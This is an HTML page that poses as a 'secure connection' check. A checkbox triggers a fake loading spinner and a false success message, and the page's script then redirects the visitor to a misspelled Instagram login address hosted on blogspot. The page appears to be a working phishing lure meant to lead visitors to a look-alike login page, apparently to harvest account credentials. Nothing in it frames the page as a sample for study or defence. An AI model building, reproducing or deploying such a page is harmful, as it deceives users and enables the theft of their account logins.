<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Connection</title>
<style>
    body {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        width: 100vw;
        margin: 0;
        font-family: Arial, sans-serif;
        overflow: hidden;
    }

    #content {
        text-align: center;
        width: 100vw;
    }
    .checkbox{
        height: 30px;
        width:30px;
        
    }
    .load{
        width: 100vw;
        height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 10px;
    }

    .loader {
        border: 8px solid #f3f3f3; /* Light grey */
        border-top: 5px solid #3498db; /* Blue */
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 2s linear infinite;
        margin-bottom: 20px;
        
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    .hidden {
        display: none;
    }
</style>
</head>
<body>

<div id="content">
    <input type="checkbox" id="secureCheckbox" class="checkbox">
    <label for="secureCheckbox">Check this box to create a secure connection</label>
</div>

<script>
    const secureCheckbox = document.getElementById('secureCheckbox');
    const content = document.getElementById('content');

    secureCheckbox.addEventListener('change', function() {
        if (this.checked) {
            content.innerHTML = '<div class="load"><div class="loader"></div>Creating a secure connection with the servers...</div>';

            setTimeout(function() {
                content.innerHTML = 'Successful secure connection. Please wait as we redirect you to the login page....';
                setTimeout(function() {
                    window.location.href="https://instagrm-login1-page.blogspot.com/p/footer-header.html";
                }, 4000); // Remove the message after 4 seconds
            }, 7000);
        }
    });
</script>

</body>
</html>
